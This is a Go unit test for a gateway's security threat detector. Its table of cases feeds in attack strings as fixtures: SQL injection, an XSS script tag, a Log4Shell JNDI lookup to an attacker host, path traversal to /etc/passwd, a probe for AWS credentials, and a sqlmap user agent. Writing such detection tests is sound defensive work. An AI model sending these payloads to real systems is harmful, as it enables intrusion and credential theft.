package api

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/gsoultan/gateon/internal/telemetry"
	gateonv1 "github.com/gsoultan/gateon/proto/gateon/v1"
	"github.com/stretchr/testify/assert"
)

func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
	ctx := context.Background()
	now := time.Now()

	tests := []struct {
		name           string
		traces         []telemetry.TraceRecord
		expectedAnom   int
		expectedType   string
		expectedReason string
	}{
		{
			name: "SQL Injection attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "1.1.1.1", Path: "/api/user?id=1' OR '1'='1", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "XSS attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "2.2.2.2", Path: "/search?q=<script>alert(1)</script>", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "Brute force",
			traces: func() []telemetry.TraceRecord {
				var r []telemetry.TraceRecord
				for i := 0; i < 15; i++ {
					r = append(r, telemetry.TraceRecord{SourceIP: "3.3.3.3", Path: "/login", Method: "POST", Status: "401 Unauthorized", Timestamp: now})
				}
				return r
			}(),
			expectedAnom:   1,
			expectedType:   "brute_force_attempt",
			expectedReason: "authentication failures",
		},
		{
			name: "Known scanning tool",
			traces: []telemetry.TraceRecord{
				{SourceIP: "4.4.4.4", Path: "/", Method: "GET", UserAgent: "sqlmap/1.4.11", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_threat",
			expectedReason: "Suspicious User-Agent",
		},
		{
			name: "Sensitive file access",
			traces: []telemetry.TraceRecord{
				{SourceIP: "5.5.5.5", Path: "/.aws/credentials", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "Log4Shell attempt",
			traces: []telemetry.TraceRecord{
				{SourceIP: "6.6.6.6", Path: "/?q=${jndi:ldap://attacker.com/a}", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
		{
			name: "Path traversal",
			traces: []telemetry.TraceRecord{
				{SourceIP: "7.7.7.7", Path: "/../../etc/passwd", Method: "GET", Timestamp: now},
			},
			expectedAnom:   1,
			expectedType:   "security_scan",
			expectedReason: "suspicious paths/payloads",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			detector := &SecurityThreatDetector{Threshold: 10}

			// Manually populate IPStats as AnomalyAnalysisEngine would
			ipStats := make(map[string]*IPStats)
			for _, tr := range tt.traces {
				stats, ok := ipStats[tr.SourceIP]
				if !ok {
					stats = &IPStats{
						UniquePaths: make(map[string]struct{}),
						UserAgents:  make(map[string]struct{}),
						Methods:     make(map[string]int),
						Referers:    make(map[string]int),
					}
					ipStats[tr.SourceIP] = stats
				}
				stats.TotalRequests++
				stats.UniquePaths[tr.Path] = struct{}{}
				if tr.UserAgent != "" {
					stats.UserAgents[tr.UserAgent] = struct{}{}
				}
				if tr.Referer != "" {
					stats.Referers[tr.Referer]++
				}
				if tr.Status != "" {
					if tr.Status == "401 Unauthorized" {
						stats.Error401++
					}
				}
				stats.LastSeen = tr.Timestamp
			}

			data := &DiagnosticData{IPStats: ipStats}
			anomalies := detector.Detect(ctx, data)

			// Filter anomalies for this specific test case's IP(s)
			var foundAnomalies []*gateonv1.Anomaly
			for _, a := range anomalies {
				for _, tr := range tt.traces {
					if a.Source == tr.SourceIP {
						foundAnomalies = append(foundAnomalies, a)
						break
					}
				}
			}

			assert.Equal(t, tt.expectedAnom, len(foundAnomalies), "Should have exactly %d anomalies for IP(s)", tt.expectedAnom)
			if tt.expectedAnom > 0 {
				a := foundAnomalies[0]
				assert.Equal(t, tt.expectedType, a.Type)
				assert.Contains(t, strings.ToLower(a.Description), strings.ToLower(tt.expectedReason))
			}
		})
	}
}
